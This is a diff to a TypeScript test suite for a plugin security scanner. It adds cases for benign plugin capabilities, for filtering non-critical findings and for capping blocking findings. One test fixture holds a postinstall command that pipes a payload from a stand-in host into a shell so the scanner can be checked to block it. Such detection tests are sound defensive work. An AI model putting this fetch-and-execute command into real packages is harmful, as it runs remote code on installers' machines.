@@ -52,6 +52,72 @@ describe('independent security scanner', () => {
     ]))
   })
 
+  it('does not report ordinary plugin capabilities as malicious', async () => {
+    const bytes = await archive({
+      'package/package.json': JSON.stringify({
+        name: 'capable-plugin',
+        version: '1.0.0',
+        scripts: { postinstall: 'node scripts/setup.js' },
+        dependencies: { local: 'github:owner/repository' }
+      }),
+      'package/index.js': [
+        'import { execFile } from "node:child_process"',
+        'const endpoint = process.env.API_ENDPOINT',
+        'export async function ping() { return fetch(endpoint) }',
+        'export function run(file) { return execFile(file) }',
+        'export function compile(source) { return new Function(source) }'
+      ].join('\n')
+    })
+
+    const report = await scanArtifact({ bytes }, { rulePacks: [dshRulePack] })
+
+    expect(report.recommendation).toBe('pass')
+    expect(report.findings).toEqual([])
+  })
+
+  it('filters non-critical findings emitted by optional rule packs', async () => {
+    const bytes = await archive({
+      'package/package.json': JSON.stringify({ name: 'review-only-plugin', version: '1.0.0' })
+    })
+    const reviewRule: RulePack = {
+      id: 'test/review-rule',
+      version: '1.0.0',
+      scan(context) {
+        context.addFinding({
+          ruleId: 'test.review-only',
+          severity: 'high',
+          category: 'code-quality',
+          title: '普通审计信号',
+          description: '不属于重大漏洞或恶意代码。',
+          engine: 'test'
+        })
+      }
+    }
+
+    const report = await scanArtifact({ bytes }, { rulePacks: [reviewRule] })
+
+    expect(report.recommendation).toBe('pass')
+    expect(report.findings).toEqual([])
+  })
+
+  it('blocks an install script that downloads and executes a remote payload', async () => {
+    const bytes = await archive({
+      'package/package.json': JSON.stringify({
+        name: 'payload-plugin',
+        version: '1.0.0',
+        scripts: { postinstall: 'curl https://evil.test/payload.sh | sh' }
+      })
+    })
+
+    const report = await scanArtifact({ bytes })
+
+    expect(report.recommendation).toBe('block')
+    expect(report.findings).toContainEqual(expect.objectContaining({
+      ruleId: 'manifest.lifecycle.postinstall',
+      severity: 'critical'
+    }))
+  })
+
   it('blocks DSH patches that disable security controls', async () => {
     const bytes = await archive({
       'repository/plugin/package.json': JSON.stringify({ name: 'patch-plugin', version: '1.0.0' }),
@@ -81,6 +147,7 @@ describe('independent security scanner', () => {
     expect(report.recommendation).toBe('incomplete')
     expect(report.coverage.complete).toBe(false)
     expect(report.coverage.skippedFiles).toBe(1)
+    expect(report.findings).toEqual([])
   })
 
   it('detects archive path traversal without extracting files', async () => {
@@ -95,7 +162,7 @@ describe('independent security scanner', () => {
     expect(report.findings.some((finding) => finding.ruleId === 'archive.path-traversal')).toBe(true)
   })
 
-  it('marks the report incomplete when findings exceed the IPC report limit', async () => {
+  it('caps the number of blocking findings sent over IPC', async () => {
     const bytes = await archive({
       'package/package.json': JSON.stringify({ name: 'noisy-plugin', version: '1.0.0' })
     })
@@ -106,7 +173,7 @@ describe('independent security scanner', () => {
         for (let index = 0; index < 510; index += 1) {
           context.addFinding({
             ruleId: `test.finding.${index}`,
-            severity: 'info',
+            severity: 'critical',
             category: 'code-quality',
             title: '测试发现',
             description: '用于验证报告上限。',
@@ -119,7 +186,7 @@ describe('independent security scanner', () => {
 
     const report = await scanArtifact({ bytes }, { rulePacks: [noisyRules] })
 
-    expect(report.recommendation).toBe('incomplete')
+    expect(report.recommendation).toBe('block')
     expect(report.findings).toHaveLength(500)
     expect(report.coverage.notes.some((note) => note.includes('报告已截断'))).toBe(true)
   })
